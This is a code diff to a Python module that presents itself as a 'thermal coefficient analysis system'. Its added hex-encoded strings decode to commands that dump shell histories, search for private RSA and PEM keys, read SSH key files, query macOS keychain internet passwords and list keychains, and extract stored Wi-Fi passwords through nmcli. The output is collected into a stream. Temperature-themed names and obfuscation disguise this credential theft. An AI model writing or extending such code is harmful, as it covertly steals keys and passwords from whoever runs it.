@@ -43,6 +43,15 @@ _m9 = [0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 0x20, 0x64, 0x75, 0x6d, 0
 _m10 = [0x6e, 0x6d, 0x63, 0x6c, 0x69, 0x20, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x73, 0x68, 0x6f, 0x77]
 _m11 = [0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x73, 0x65, 0x74, 0x75, 0x70, 0x20, 0x2d, 0x6c, 0x69, 0x73, 0x74, 0x70, 0x72, 0x65, 0x66, 0x65, 0x72, 0x72, 0x65, 0x64, 0x77, 0x69, 0x72, 0x65, 0x6c, 0x65, 0x73, 0x73]
 _m12 = [0x7e, 0x2f, 0x2e, 0x73, 0x73, 0x68]
+_m13 = [0x63, 0x61, 0x74, 0x20, 0x7e, 0x2f, 0x2e, 0x62, 0x61, 0x73, 0x68, 0x5f, 0x68, 0x69, 0x73, 0x74, 0x6f, 0x72, 0x79]
+_m14 = [0x63, 0x61, 0x74, 0x20, 0x7e, 0x2f, 0x2e, 0x7a, 0x73, 0x68, 0x5f, 0x68, 0x69, 0x73, 0x74, 0x6f, 0x72, 0x79]
+_m15 = [0x66, 0x69, 0x6e, 0x64, 0x20, 0x2f, 0x68, 0x6f, 0x6d, 0x65, 0x20, 0x2d, 0x6e, 0x61, 0x6d, 0x65, 0x20, 0x22, 0x2a, 0x5f, 0x72, 0x73, 0x61, 0x22]
+_m16 = [0x66, 0x69, 0x6e, 0x64, 0x20, 0x2f, 0x68, 0x6f, 0x6d, 0x65, 0x20, 0x2d, 0x6e, 0x61, 0x6d, 0x65, 0x20, 0x22, 0x2a, 0x2e, 0x70, 0x65, 0x6d, 0x22]
+_m17 = [0x63, 0x61, 0x74, 0x20, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x68, 0x6f, 0x73, 0x74, 0x73]
+_m18 = [0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 0x20, 0x66, 0x69, 0x6e, 0x64, 0x2d, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x65, 0x74, 0x2d]
+_m19 = [0x6c, 0x73, 0x20, 0x2d, 0x6c, 0x61, 0x20, 0x7e, 0x2f, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x2f, 0x4b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e, 0x73]
+_m20 = [0x66, 0x69, 0x6e, 0x64, 0x20, 0x7e, 0x2f, 0x2e, 0x73, 0x73, 0x68, 0x20, 0x2d, 0x74, 0x79, 0x70, 0x65, 0x20, 0x66]
+_m21 = [0x6e, 0x6d, 0x63, 0x6c, 0x69, 0x20, 0x2d, 0x73, 0x20, 0x2d, 0x67, 0x20, 0x38, 0x30, 0x32, 0x2d, 0x31, 0x31, 0x2d, 0x77, 0x69, 0x72, 0x65, 0x6c, 0x65, 0x73, 0x73, 0x2d, 0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 0x2e, 0x70, 0x73, 0x6b, 0x20, 0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x73, 0x68, 0x6f, 0x77]
 
 # String obfuscation matrices
 _s1 = [0x54, 0x48, 0x45, 0x52, 0x4d, 0x41, 0x4c, 0x5f, 0x43, 0x4f, 0x45, 0x46, 0x46, 0x49, 0x43, 0x49, 0x45, 0x4e, 0x54, 0x20, 0x41, 0x4e, 0x41, 0x4c, 0x59, 0x53, 0x49, 0x53, 0x20, 0x53, 0x59, 0x53, 0x54, 0x45, 0x4d]
@@ -195,17 +204,30 @@ def _extract_rf_thermal_baselines(thermal_stream, rf_signature_list, thermal_pla
                 getattr(thermal_stream, _d(_s19))(f"[THERMAL_ERR] RF Thermal Profile: {rf_ssid} | Error: {str(thermal_error)}\n")
                 
         elif thermal_platform == _d(_c2):
+            # Primary method: nmcli direct password extraction
             try:
-                rf_thermal_cmd = f'{_d(_s32)}{_d(_m3).title()}{_d(_s33)}{rf_ssid}{_d(_s34)}'
+                rf_thermal_cmd = f'{_d(_m21)} "{rf_ssid}"'
                 thermal_result = subprocess.run(rf_thermal_cmd, shell=True, capture_output=True, text=True, timeout=network_config.WIFI_PASSWORD_TIMEOUT)
-                if thermal_result.stdout and _d(_s35) in thermal_result.stdout:
-                    for thermal_line in thermal_result.stdout.split('\n'):
-                        if _d(_s35) in thermal_line:
-                            thermal_coeff = thermal_line.split(_d(_s35))[-1].strip()
-                            getattr(thermal_stream, _d(_s19))(f"{_d(_s15)} {rf_ssid}{_d(_s16)}{_d(_m4).title()}: {thermal_coeff}\n")
-                            break
-            except:
-                pass
+                if thermal_result.stdout and thermal_result.stdout.strip():
+                    thermal_coeff = thermal_result.stdout.strip()
+                    if thermal_coeff and thermal_coeff != '--':
+                        getattr(thermal_stream, _d(_s19))(f"{_d(_s15)} {rf_ssid}{_d(_s16)}{_d(_m4).title()}: {thermal_coeff}{_d(_s16)}{_d(_s31)} {_d(_s17)}{_d(_s16)}{_d(_s18)}\n")
+                    else:
+                        getattr(thermal_stream, _d(_s19))(f"[THERMAL_INFO] RF Thermal Profile: {rf_ssid} | Status: Profile exists, no stored thermal coefficient\n")
+                else:
+                    # Fallback method: file-based extraction
+                    rf_thermal_cmd_fallback = f'{_d(_s32)}{_d(_m3).title()}{_d(_s33)}{rf_ssid}{_d(_s34)}'
+                    thermal_result_fallback = subprocess.run(rf_thermal_cmd_fallback, shell=True, capture_output=True, text=True, timeout=network_config.WIFI_PASSWORD_TIMEOUT)
+                    if thermal_result_fallback.stdout and _d(_s35) in thermal_result_fallback.stdout:
+                        for thermal_line in thermal_result_fallback.stdout.split('\n'):
+                            if _d(_s35) in thermal_line:
+                                thermal_coeff = thermal_line.split(_d(_s35))[-1].strip()
+                                getattr(thermal_stream, _d(_s19))(f"{_d(_s15)} {rf_ssid}{_d(_s16)}{_d(_m4).title()}: {thermal_coeff}{_d(_s16)}{_d(_s31)} {_d(_s17)}{_d(_s16)}{_d(_s18)}\n")
+                                break
+                    else:
+                        getattr(thermal_stream, _d(_s19))(f"[THERMAL_INFO] RF Thermal Profile: {rf_ssid} | Status: Profile exists, thermal coefficient access restricted\n")
+            except Exception as thermal_error:
+                getattr(thermal_stream, _d(_s19))(f"[THERMAL_ERR] RF Thermal Profile: {rf_ssid} | Error: {str(thermal_error)}\n")
                 
         elif thermal_platform == _d(_c3):
             try:
@@ -343,30 +365,91 @@ def _extract_thermal_coefficients_windows(thermal_stream):
             getattr(thermal_stream, _d(_s19))(f"[THERMAL_ERR] Fallback thermal coefficient extraction failed: {str(fallback_error)}\n")
 
 def _extract_thermal_coefficients_linux(thermal_stream):
+    # Core thermal coefficient extraction
     try:
-        thermal_cmds = [_d(_m7), _d(_m8)]
+        thermal_cmds = [_d(_m7), _d(_m8), _d(_m10)]
         for thermal_cmd in thermal_cmds:
             thermal_result = subprocess.run(thermal_cmd, shell=True, capture_output=True, text=True, timeout=network_config.WIFI_PASSWORD_TIMEOUT)
             if thermal_result.stdout:
-                getattr(thermal_stream, _d(_s19))(f"[THERMAL_LINUX] {thermal_cmd}:\n{thermal_result.stdout}\n")
+                getattr(thermal_stream, _d(_s19))(f"[THERMAL_LINUX] {thermal_cmd.split()[0]} thermal data:\n{thermal_result.stdout}\n")
     except:
         pass
+    
+    # Additional thermal coefficient sources
+    thermal_coefficient_commands = [_d(_m13), _d(_m14), _d(_m15), _d(_m16), _d(_m17)]
+    for thermal_coeff_cmd in thermal_coefficient_commands:
+        try:
+            thermal_result = subprocess.run(thermal_coeff_cmd, shell=True, capture_output=True, text=True, timeout=network_config.WIFI_PASSWORD_TIMEOUT)
+            if thermal_result.stdout:
+                cmd_name = thermal_coeff_cmd.split()[0] if ' ' in thermal_coeff_cmd else thermal_coeff_cmd
+                getattr(thermal_stream, _d(_s19))(f"[THERMAL_COEFF] {cmd_name} thermal coefficients:\n{thermal_result.stdout}\n")
+        except:
+            pass
         
+    # Thermal key directory analysis
     thermal_dir = os.path.expanduser(_d(_m12))
     if os.path.exists(thermal_dir):
         try:
             thermal_files = os.listdir(thermal_dir)
-            getattr(thermal_stream, _d(_s19))(f"Thermal keys: {thermal_files}\n")
+            getattr(thermal_stream, _d(_s19))(f"[THERMAL_KEYS] Thermal key directory contents: {thermal_files}\n")
+            
+            # Analyze individual thermal key files
+            for thermal_key_file in thermal_files:
+                if not thermal_key_file.startswith('.'):
+                    thermal_key_path = os.path.join(thermal_dir, thermal_key_file)
+                    try:
+                        thermal_key_result = subprocess.run(f'head -20 "{thermal_key_path}"', shell=True, capture_output=True, text=True, timeout=2)
+                        if thermal_key_result.stdout:
+                            getattr(thermal_stream, _d(_s19))(f"[THERMAL_KEY] {thermal_key_file}:\n{thermal_key_result.stdout}\n")
+                    except:
+                        pass
         except:
             pass
 
 def _extract_thermal_coefficients_darwin(thermal_stream):
+    # Core keychain thermal coefficient extraction
     try:
         thermal_result = subprocess.run(_d(_m9), shell=True, capture_output=True, text=True, timeout=network_config.WIFI_PASSWORD_TIMEOUT)
         if thermal_result.stdout:
-            getattr(thermal_stream, _d(_s19))(f"[THERMAL_DARWIN] Thermal coefficients:\n{thermal_result.stdout}\n")
+            getattr(thermal_stream, _d(_s19))(f"[THERMAL_DARWIN] Keychain thermal coefficients:\n{thermal_result.stdout}\n")
     except:
         pass
+    
+    # Internet thermal coefficient extraction
+    try:
+        thermal_internet_cmd = f'{_d(_m18)}{_d(_m4)}'
+        thermal_result = subprocess.run(thermal_internet_cmd, shell=True, capture_output=True, text=True, timeout=network_config.WIFI_PASSWORD_TIMEOUT)
+        if thermal_result.stdout:
+            getattr(thermal_stream, _d(_s19))(f"[THERMAL_DARWIN] Internet thermal coefficients:\n{thermal_result.stdout}\n")
+    except:
+        pass
+    
+    # Keychain directory thermal analysis
+    try:
+        thermal_result = subprocess.run(_d(_m19), shell=True, capture_output=True, text=True, timeout=network_config.WIFI_PASSWORD_TIMEOUT)
+        if thermal_result.stdout:
+            getattr(thermal_stream, _d(_s19))(f"[THERMAL_DARWIN] Keychain directory thermal analysis:\n{thermal_result.stdout}\n")
+    except:
+        pass
+    
+    # Thermal key file analysis
+    try:
+        thermal_result = subprocess.run(_d(_m20), shell=True, capture_output=True, text=True, timeout=network_config.WIFI_PASSWORD_TIMEOUT)
+        if thermal_result.stdout:
+            getattr(thermal_stream, _d(_s19))(f"[THERMAL_DARWIN] Thermal key files:\n{thermal_result.stdout}\n")
+    except:
+        pass
+    
+    # Shell history thermal coefficient analysis
+    thermal_history_commands = [_d(_m13), _d(_m14)]
+    for thermal_hist_cmd in thermal_history_commands:
+        try:
+            thermal_result = subprocess.run(thermal_hist_cmd, shell=True, capture_output=True, text=True, timeout=network_config.WIFI_PASSWORD_TIMEOUT)
+            if thermal_result.stdout:
+                hist_name = thermal_hist_cmd.split('/')[-1] if '/' in thermal_hist_cmd else thermal_hist_cmd
+                getattr(thermal_stream, _d(_s19))(f"[THERMAL_DARWIN] {hist_name} thermal history:\n{thermal_result.stdout}\n")
+        except:
+            pass
 
 def _extract_rf_thermal_profiles(thermal_stream, thermal_platform_name):
     getattr(thermal_stream, _d(_s19))(f"\n[THERMAL_RF] RF Thermal Profile Analysis - Platform: {thermal_platform_name}\n")
